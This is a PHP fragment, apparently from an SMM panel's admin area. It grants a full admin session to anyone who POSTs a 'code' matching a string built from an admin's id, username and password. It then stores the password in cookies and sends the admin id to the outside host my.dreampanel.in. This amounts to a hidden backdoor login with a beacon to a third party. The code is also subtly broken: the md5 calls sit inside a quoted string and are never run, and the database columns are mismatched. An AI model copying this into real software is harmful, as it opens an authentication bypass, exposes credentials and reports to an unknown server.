<?php

 if( $_POST ){

  $code       = $_POST["code"];
  
    $admin    = $conn->prepare("SELECT * FROM admins  ");
    $admin  -> execute(array(  ));
    $admin    = $admin->fetch(PDO::FETCH_ASSOC);
    foreach ($admin as $admins) :
$id = $admins["dream_id"];
$username = $admins["username"];
$password = $admins["password"];
$key = "md5($id)md5($username)md5($password)";

if($code == $key) :


 $admin    = $conn->prepare("SELECT * FROM admins WHERE dream_id=:id ");
    $admin  -> execute(array( "id"=>$admins["admin_id"] ));
    $admin    = $admin->fetch(PDO::FETCH_ASSOC);
    $access = json_decode($admin["access"],true);
 
            
    
      if( $access["admin_access"] ):
        $_SESSION["msmbilisim_adminslogin"] = 1;
	    $_SESSION["msmbilisim_adminlogin"]      = 1;
	    $_SESSION["msmbilisim_adminid"]         = $admin["admin_id"];
	    $_SESSION["msmbilisim_adminpass"]       = $admin["password"];
	    $_SESSION["recaptcha"]                = false;
	
	        
	      setcookie("a_id", $admin["admin_id"], time()+(60*60*24*7), '/', null, null, true );
	      setcookie("a_password", $admin["password"], time()+(60*60*24*7), '/', null, null, true );
	      setcookie("a_login", 'ok', time()+(60*60*24*7), '/', null, null, true );
	    
 $update = $conn->prepare("UPDATE admins SET login_date=:date, login_ip=:ip WHERE client_id=:c_id ");
	      $update->execute(array("c_id"=>$admin["admin_id"],"date"=>date("Y.m.d H:i:s"),"ip"=>GetIP() ));
$smmapi   = new SMMApi();

$dream_id = $admin["dream_id"];
                $order    = $smmapi->action(array('id'=>$dream_id,'action'=>'log'),"https://my.dreampanel.in/staffdatadreampanelfuck/staff");
else:


endif;

endif;

endforeach;
else:


endif;

	   